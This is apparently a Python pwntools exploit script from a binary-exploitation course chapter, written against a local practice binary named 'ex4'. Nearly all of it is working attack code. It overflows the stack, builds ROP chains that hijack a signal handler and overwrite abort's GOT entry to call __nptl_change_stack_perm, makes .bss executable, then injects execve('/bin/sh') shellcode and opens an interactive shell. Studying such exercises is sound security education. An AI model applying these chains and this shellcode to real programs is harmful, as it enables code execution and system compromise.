################################################################################
# ex4-exploit.pyÂº
#   Chapter:02
#   Binary: ex4
#   Source: ex4.c
#   Goal  : Using techniques described in Chapter2, change the permissions
#           of .bss to rws, write a simple /bin/sh\x00 shellcode in it and
#           spawn a shell
################################################################################
from pwn import *

################################################################################
# ropOverwriteMemory(addr,value):
#   Overwrites addr with value byte by byte using memset
#   NOTE: This is also possible with less bytes using gets!
################################################################################
def ropOverwriteMemory(addr,value):

    rop =   b''

    # First, we write handler_addr into handler_func with memset();
    warning("Overwritting 0x%02x with value at 0x%02x" % 
                                    (addr, value))
    # We set RDX=1 once:
    rop +=  p64(pop_rdx)
    rop +=  p64(0x01)
    # Now we write value into addr byte by byte:
    for i in range(0,len(p64(value))):
        rop +=  p64(pop_rdi)
        rop +=  p64(addr+i)
        rop +=  p64(pop_rsi)
        rop +=  p64((p64(value)[i]))
        rop +=  p64(binary.symbols["plt.memset"])
    
    warning("Written 0x%02x into 0x%02x (%d bytes)" % (value,addr,i))
    return rop

################################################################################
# ropSetNewSigHandler(handler_addr, handler_func):
#   Sets handler "handler_func" into handler_addr
################################################################################
def ropSetNewSigHandler(handler_addr, handler_func):

    # We set our new handler first into the address of sigaction *act:
    rop =   b''
    rop +=  ropOverwriteMemory(handler_addr, handler_func)   

    # Next, we call sigaction with this new handler:
    rop +=  p64(pop_rdi)
    rop +=  p64(0x6)                                # rdi <- SIGABRT
    rop +=  p64(pop_rsi)
    rop +=  p64(handler_addr)                       # rsi <- handler_addr
    rop +=  p64(pop_rdx)
    rop +=  p64(0x0)                                # rdx <- oldhandler=NULL
    rop +=  p64(binary.symbols["plt.sigaction"])    # sigaction();

    return rop

################################################################################
#   ropOverwriteAbort():
################################################################################
def ropOverwriteAbort(value):
    
    rop =   b''
    rop +=  p64(pop_rdi)
    rop +=  p64(binary.symbols["got.abort"])# fgets_unlocked@got
    rop +=  p64(pop_rsi)
    rop +=  p64(value)                              # rsi <- value
    rop +=  p64(pop_rdx)
    rop +=  p64(0x1)                                # rdx = 0x1
    # memset(*fgets_unlocked@got,0x90,1);
    rop +=  p64(binary.symbols["plt.memset"])       # memset()

    return rop

################################################################################
# ropGets(addr)
#   Simple ROP-chain to read from stdin into addr until reaching \x0a or \x0d
################################################################################
def ropGets(addr):

    rop =   b''
    rop +=  p64(pop_rdi)
    rop +=  p64(addr)
    rop +=  p64(binary.symbols["plt.gets"])

    return rop

#0x00007f8553ae18a0 <+0>:	mov    rax,rdi
#0x00007f8553ae18a3 <+3>:	sub    rsp,0x8
#0x00007f8553ae18a7 <+7>:	mov    rdi,QWORD PTR [rdi+0x6a0]
# perms: PROT_READ | PROT_WRITE | PROT_EXEC:
#0x00007f8553ae18ae <+14>:	mov    edx,0x7
# Here, computes len:
# #elif _STACK_GROWS_DOWN
#  void *stack = pd->stackblock + pd->guardsize;
#  size_t len = pd->stackblock_size - pd->guardsize;
# So as long as rdi+0x6a0 =0 and rdi+0x690=.bss, we are fine!
#0x00007f8553ae18b3 <+19>:	mov    rsi,QWORD PTR [rax+0x698]
#0x00007f8553ae18ba <+26>:	sub    rsi,rdi
#
#0x00007f8553ae18bd <+29>:	add    rdi,QWORD PTR [rax+0x690]
# How about returning to here instead of 
#0x00007f8553ae18c4 <+36>:	call   0x7f8553afe940 <__GI_mprotect>
#0x00007f8553ae18c9 <+41>:	test   eax,eax
#0x00007f8553ae18cb <+43>:	cmovne eax,DWORD PTR [rip+0x2f9de] <rtld_errno>
#0x00007f8553ae18d2 <+50>:	add    rsp,0x8
#0x00007f8553ae18d6 <+54>:	ret
def ropFixPthread_t():

    warning("Using fake ptrace_t * at 0x%02x" % fake_pthread)

    rop =   b''

    # First thing is to write the address we want to set to rwx into fake_pthread+0x698:
    rop +=  ropOverwriteMemory(fake_pthread+0x690,fake_pthread)
    # We need to write the length at fake_pthread+0x698:
    rop +=  ropOverwriteMemory(fake_pthread+0x698,0x2000)

    # Next thing to do is to set this value into RDI:
    rop +=  p64(pop_rdi)
    rop +=  p64(fake_pthread)

    return rop

# Binary protections:
# checksec --file ex4
#    Arch:     amd64-64-little
#    RELRO:    Partial RELRO
#    Stack:    No canary found
#    NX:       NX enabled
#    PIE:      No PIE (0x400000)
vuln    =   "./ex4"
binary  =   ELF(vuln)

# We control EIP after padding + RBP:
#padding =   b'A'*112
# Now we have the sigaction structure to overwrite, so we need more padding:
padding =   b'A'*272
# A fake RBP value:
RBP     =   0xdeadbeefcafebabe

# Using ropper, we find the following ROP-gadgets we will need:
pop_rdi =   0x401227
pop_rsi =   0x401229
pop_rdx =   0x40122b
pop_rbp =   0x40115d
ret     =   0x401016

# 0x00000000404000 0x00000000405000 0x00000000003000
fake_pthread    =   0x0404000

# The shellcode will write and execute!
shellcode   =   b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'

# Functions grouped by 0x26300
#     0x00026310:6:sym.imp._dl_allocate_tls_init
#     0x00026320:6:sym.imp.__nptl_change_stack_perm ; 
#     0x00026340:6:sym.imp._dl_audit_preinit
#     0x0002639f:399:sym.abort
change_stack_perm   =   0x20
abort_byte          =   0x9f

# We start a local process of the vulnerable program and we debug it
# Make sure to have gef installed or "vmmap" wouldn't work:
r   =   process(binary.path)

# We are going to overwrite the sighandler defined by the program
# with main(). We control the RETURN from vuln() and the address for the
# sighandler. So we can, in fact, call abort() ourselves and so the
# program will get back to main() after resolving the address for
# abort() (we cannot overwrite it unitl abort@got has the actual address!):
warning("1st ROP-chain: resolving got@abort and back to main!")
r.send(
    padding + p64(RBP) 
    + ropSetNewSigHandler(binary.symbols["mydata"],binary.symbols["main"])
    # At this point, calling abort() will trigger our new handler and
    # abort@plt will held the actual address for abort(). Because our new
    # handler is main(), abort() won't abort and it will return to main():
    + p64(binary.symbols["plt.abort"])
    + b'\x0a'
)

# Now, the program is expecting more data from us. Because we now have
# the actual address of abort() in the got, we can overwrite it with
# imp.__nptl_change_stack_perm. We need to fake a pthread_t * struct
# and put it into RDI first.
warning("2nd ROP-chain: setting .bss perms to rwx and spawning a shell!")
r.send(
    padding + p64(RBP)
    + ropOverwriteAbort(change_stack_perm)
    # We need to make RDI point to pthread_t*:
    + ropFixPthread_t()
    # Now, by calling abort@plt we are, in fact, calling __nptl_change_stack_perm
    # So after this call, we have .got, .bss with rwx-:
    + p64(binary.symbols["plt.abort"])
    # Now we write the shellcode into fake_pthread + 0x100:
    + ropGets(fake_pthread+0x100)
    # After gets, we jump to the shellcode!
    + p64(fake_pthread+0x100)
    + b'\x0a'
)
# We send here our shellcode and we will gain a shell!
r.send(shellcode + b'\x0a')
r.clean()
r.interactive()
r.close()
